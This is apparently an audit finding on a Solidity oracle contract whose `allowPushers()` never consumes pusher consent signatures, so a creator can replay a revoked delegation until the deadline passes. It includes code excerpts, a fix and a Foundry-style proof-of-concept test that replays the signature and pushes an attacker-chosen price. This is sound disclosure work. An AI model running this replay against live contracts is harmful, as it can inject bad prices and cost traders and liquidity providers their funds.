### Title
Pusher Consent Signature Not Consumed in `allowPushers()` — Creator Can Replay Revoked Delegation Within Deadline Window - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers()` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but never marks it as used. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the original signature (same `deadline`, same `pusher`, same `msg.sender`) to re-establish the delegation — as long as the deadline has not yet expired. The pusher's self-protection mechanism is therefore broken for the entire deadline window.

---

### Finding Description

`allowPushers()` builds a hash over `(chainid, address(this), deadline, pusher, msg.sender)` and verifies the pusher's ECDSA signature, then writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
// CompressedOracle.sol lines 192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← written, signature never consumed
    emit PusherAuthorized(pusher, msg.sender);
}
``` [1](#0-0) 

`revokePusher()` clears the mapping:

```solidity
// CompressedOracle.sol lines 238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

Because no nonce, used-signature bitmap, or per-pusher revocation counter exists, the creator can call `allowPushers()` again with the identical `(deadline, pusher, sig)` tuple immediately after the pusher's `revokePusher()` transaction, re-writing `namespaceRemapping[pusher] = creator`. The pusher's revocation is silently undone.

The code's own NatDoc comment acknowledges the deadline is the *only* replay guard:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

The deadline limits the attack window but does not prevent re-establishment within that window. The slot-structure documentation repeats the same claim: [4](#0-3) 

---

### Impact Explanation

The `fallback()` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

If the pusher's private key is compromised and the pusher calls `revokePusher()` to stop bad prices from flowing into the creator's namespace, the creator (or any party who saved the original calldata) can replay `allowPushers()` with the same signature to re-establish delegation. The compromised key then continues writing arbitrary price/spread values into the creator's namespace. Pools and price providers reading from that namespace via `price()` / `getOracleData()` receive the attacker-controlled bid/ask, leading to bad-price execution and potential loss of trader or LP principal.

---

### Likelihood Explanation

- `allowPushers()` is a public, permissionless function callable by any creator.
- The original calldata (deadline, pusher address, signature bytes) is permanently visible on-chain from the first delegation transaction.
- The creator needs only to re-submit the same calldata before the deadline expires; no new signature or off-chain coordination is required.
- Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`), giving a wide replay window. [6](#0-5) 

---

### Recommendation

Track consumed signatures with a per-pusher revocation nonce or a `mapping(bytes32 => bool) usedSignatures` bitmap. Increment or record the hash on first use inside `allowPushers()` and revert if the same hash is presented again:

```solidity
mapping(bytes32 => bool) private _usedDelegationSigs;

// inside allowPushers loop:
bytes32 hash = ...; // existing hash
require(!_usedDelegationSigs[hash], "signature already used");
_usedDelegationSigs[hash] = true;
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, include a per-pusher nonce in the signed payload so each consent is single-use by construction.

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator);

// 3. Pusher revokes — intends to stop writes to creator's namespace
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// 4. Creator replays the SAME signature — no new consent from pusher
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig)); // succeeds!
assertEq(oracle.namespaceRemapping(pusher), creator);   // delegation restored

// 5. Compromised pusher key pushes bad price into creator's namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 badRaw = _packRaw(9_000_000, 5, 0); // attacker-chosen price
vm.prank(pusher); // attacker controls this key
(bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
assertTrue(ok);

// 6. Pool reads bad price from creator's namespace
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(data.price, U64x32.decode(uint32(badRaw >> 16))); // attacker price is live
```
